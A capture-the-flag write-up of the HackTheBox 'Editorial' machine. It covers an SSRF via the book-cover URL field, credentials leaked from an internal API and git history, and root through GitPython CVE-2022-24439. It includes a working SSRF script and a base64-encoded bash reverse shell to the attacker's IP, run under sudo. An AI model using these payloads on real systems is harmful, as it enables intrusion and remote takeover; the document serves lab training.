---
render_with_liquid: false
title: HackTheBox Writeup  Editorial
date: 2024-06-17 12:14:57 +1400
tags: [hackthebox, nmap, linux, feroxbuster, python-flask, ssrf, ffuf, discover-secrets, git, sudo, python-script, gitpython, cve-2022-24439, oscp-like-2023]
---



`Editorial` is an easy difficulty Linux machine that features a publishing web application vulnerable to `Server-Side Request Forgery (SSRF)`. This vulnerability is leveraged to gain access to an internal running API, which is then leveraged to obtain credentials that lead to `SSH` access to the machine. Enumerating the system further reveals a Git repository that is leveraged to reveal credentials for a new user. The `root` user can be obtained by exploiting [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) and the sudo configuration.


# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editorial]
└─$ pt init '10.129.46.43 editorial.htb tiempoarriba.htb'
+-----------+--------+--------------+------------------+
|  PROFILE  | STATUS |      IP      |      DOMAIN      |
+-----------+--------+--------------+------------------+
| editorial | on     | 10.129.46.43 | editorial.htb    |
| editorial | on     | 10.129.46.43 | tiempoarriba.htb |
+-----------+--------+--------------+------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Jun 17 12:14:57 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.64.241
Nmap scan report for 10.129.64.241
Host is up, received user-set (0.28s latency).
Scanned at 2024-06-17 12:14:57 CST for 16s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Jun 17 12:15:13 2024 -- 1 IP address (1 host up) scanned in 16.35 seconds
```


## 80 - HTTP : Editorial Tiempo Arriba


### Info

```ruby
http://editorial.htb [200] [Editorial Tiempo Arriba] [nginx/1.18.0 (Ubuntu)] [2239cce6b454b463ceb95eecf9fbef19dc085d59] [Bootstrap,Nginx:1.18.0,Ubuntu]
```

![](/assets/obsidian/0f5ab8b06182438d07538e7e85e52e42.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):80" -o ferox_80.txt
```

```bash
200      GET      210l      537w     7140c http://editorial.htb/upload
200      GET       72l      232w     2939c http://editorial.htb/about
302      GET        5l       22w      201c http://editorial.htb/upload-cover => http://editorial.htb/upload
200      GET        7l     2189w   194901c http://editorial.htb/static/css/bootstrap.min.css
200      GET       81l      467w    28535c http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
200      GET      177l      589w     8577c http://editorial.htb/
200      GET     4780l    27457w  2300540c http://editorial.htb/static/images/pexels-min-an-694740.jpg
200      GET    10938l    65137w  4902042c http://editorial.htb/static/images/pexels-janko-ferlic-590493.jpg
```

# User Flag
---

## Enumeration


### 80 - Flask app

- Identified `Flask` web app based on `404` status page

![](/assets/obsidian/3a627184748f35d6e4e1df1b2a7842fc.png)

![](/assets/obsidian/9e1856a368ccf468da7f4ef45b5edb75.png)

## Shell as dev


### 80 - Flask app : SSRF


#### Identify

> http://editorial.htb/upload

- There's a book submission form, we can choose to upload cover from remote URL

Test XSS in input fields

![](/assets/obsidian/c5ad28965cc4c69572b71326c5361d2b.png)

- It seems to be using python `requests` package to download image, it's unlikely vulnerable to command injection
- Didn't receive any callback from XSS payload

```bash
simplehttpserver -listen 0.0.0.0:80 -verbose
```

![](/assets/obsidian/154d9082a314290d0c92931fae194c76.png)

- After sending the cover URL in `bookurl` parameter, it will return a URL path to the uploaded file

![](/assets/obsidian/8fe3a0776b5798f5b24d53f54c1d9bed.png)

Make it fetch localhost

- If `bookurl` isn't valid, it will return a demo cover's url  : `/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg` 

![](/assets/obsidian/13be97ce41e79877a8b5f8ea6c666a94.png)

#### Port scanning

> `ssrf.req`

```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------167008962427088142091823041654
Content-Length: 359
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload
DNT: 1
Sec-GPC: 1

-----------------------------167008962427088142091823041654
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------167008962427088142091823041654
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------167008962427088142091823041654--
```

Fuzz common ports on localhost

```bash
ffuf -c --request-proto http -request ssrf.req -w <(seq 65535) -fr 'unsplash_photo_1630734277837_ebe62757b6e0'
```

![](/assets/obsidian/411b73d85ce6b9e1059c76822f67890c.png)

#### Credential from api endpoints

Check the response of port `5000`

![](/assets/obsidian/65dd18bb10f9a6b4ac41eac625ba2a98.png)

- It seems to be an API server

![](/assets/obsidian/ce6489fedda81b5869b32fdde881e728.png)

Made a python script to automate the process

> `ssrf.py`

```python
import sys
import requests


def fetch(url: str):
    headers = {
    'Host': 'editorial.htb',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'multipart/form-data; boundary=---------------------------167008962427088142091823041654',
    'Origin': 'http://editorial.htb',
    'Connection': 'close',
    'Referer': 'http://editorial.htb/upload',
    'DNT': '1',
    'Sec-GPC': '1',
    }

    data = f'-----------------------------167008962427088142091823041654\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n{url}\r\n-----------------------------167008962427088142091823041654\r\nContent-Disposition: form-data; name="bookfile"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------167008962427088142091823041654--\r\n'

    response = requests.post('http://editorial.htb/upload-cover', headers=headers, data=data, verify=False)
    result_url = f"http://editorial.htb/{response.text}"
    r = requests.get(result_url)
    return r


if __name__ == "__main__":
    result = fetch(sys.argv[1])
    print(result.text)
```

- Available api endpoints

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editorial]
└─$ p python ssrf.py http://127.0.0.1:5000 | jq .
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

- There's a pair of credentials in `/api/latest/metadata/messages/authors`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editorial]
└─$ p -q python ssrf.py http://127.0.0.1:5000/api/latest/metadata/messages/authors | jq .template_mail_message -r
Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.

Your login credentials for our internal forum and authors site are:
Username: dev
Password: dev080217_devAPI!@
Please be sure to change your password as soon as possible for security purposes.

Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.

Best regards, Editorial Tiempo Arriba Team.
```

### 22 - SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editorial]
└─$ cssh $(pt get rhost) dev 'dev080217_devAPI!@'
Warning: Permanently added 'editorial.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
[...]
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

# Root Flag
---


## From dev to prod

### Situation awareness

- Likely : `prod` -> `root`

```bash
dev@editorial:~$ for u in $(cat /etc/passwd | grep sh$ | cut -d":" -f1 2>/dev/null);do id $u;done 2>/dev/null | sort -unt '=' -k2
uid=0(root) gid=0(root) groups=0(root)
uid=1000(prod) gid=1000(prod) groups=1000(prod)
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

- No database listening, no need to harvest database

```bash
dev@editorial:~$ ss -ltnp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                  Process
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*
LISTEN                   0                        511                                              0.0.0.0:80                                            0.0.0.0:*
LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*
LISTEN                   0                        2048                                           127.0.0.1:5000                                          0.0.0.0:*
LISTEN                   0                        128                                                 [::]:22                                               [::]:*
```

### Credential in git commits

```bash
dev@editorial:~$ ls -la
total 40
drwxr-x--- 5 dev  dev  4096 Jun 18 15:28 .
drwxr-xr-x 4 root root 4096 Jun  5 14:36 ..
drwxrwxr-x 3 dev  dev  4096 Jun  5 14:36 apps
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
drwx------ 2 dev  dev  4096 Jun  5 14:36 .cache
drwx------ 3 dev  dev  4096 Jun 18 12:20 .gnupg
-rw------- 1 dev  dev    34 Jun 18 14:53 .lesshst
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
-rw-r----- 1 root dev    33 Jun 17 16:26 user.txt
```

- The `apps` folder only contains `.git` repo profile

```bash
dev@editorial:~$ cd apps/
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 5 dev dev 4096 Jun 18 14:53 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```

- Assume that its files were copied to `/opt/internal_apps/app_api/`

```bash
dev@editorial:~/apps$ ls -la /opt/internal_apps/app_api/
total 24
drwxr-xr-x 3 root     root     4096 Jun  5 14:36 .
drwxr-xr-x 5 www-data www-data 4096 Jun  5 14:36 ..
-rw-r--r-- 1 root     root     5273 Jan 16 19:47 app.py
drwxr-xr-x 2 root     root     4096 Jun  5 14:36 __pycache__
-rwxr-xr-x 1 root     root       62 Feb  4  2023 wsgi.py
```

Get git logs

```bash
git log -p
```

- Search for `pass`

![](/assets/obsidian/1af118dd35dd927316b3da00e391cc04.png)

- Found `prod`'s credential that was removed

![](/assets/obsidian/615ffd53ded4d67b89b522cf0789a2a7.png)

Switch to `prod`

```bash
dev@editorial:~$ su - prod
Password:080217_Producti0n_2023!@
prod@editorial:~$ id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
```


## From prod to root


### SUDO - Python script : GitPython RCE (CVE-2022-24439)

```bash
prod@editorial:~$ sudo -l
[sudo] password for prod:
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

```bash
prod@editorial:~$ ls -la /opt/internal_apps/clone_changes/clone_prod_change.py
-rwxr-x--- 1 root prod 256 Jun  4 11:30 /opt/internal_apps/clone_changes/clone_prod_change.py
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py

#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Check `GitPython`'s version from pip packages

```bash
prod@editorial:/tmp$ pip freeze | grep git -i
gitdb==4.0.10
GitPython==3.1.29
```

- Google : `GitPython 3.1.29 exploit`

> POC + DOC - https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

![](/assets/obsidian/15d893f7c8999bc785f3221b063c96b0.png)

![](/assets/obsidian/d09a3152fada340f8b5079f2473700fd.png)

Craft reverse shell payload

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editorial]
└─$ echo "echo $(echo "bash -i >& /dev/tcp/$(pt get lhost)/1111 0>&1"|base64 -w0)|base64 -d|/bin/bash"
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNy8xMTExIDA+JjEK|base64 -d|/bin/bash
```

- `%` is required before any spaces in command

```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c echo% YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNy8xMTExIDA+JjEK|base64% -d|/bin/bash"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editorial]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.46.43] 34834
root@editorial:/opt/internal_apps/clone_changes# id
id
uid=0(root) gid=0(root) groups=0(root)
```


# Additional
---
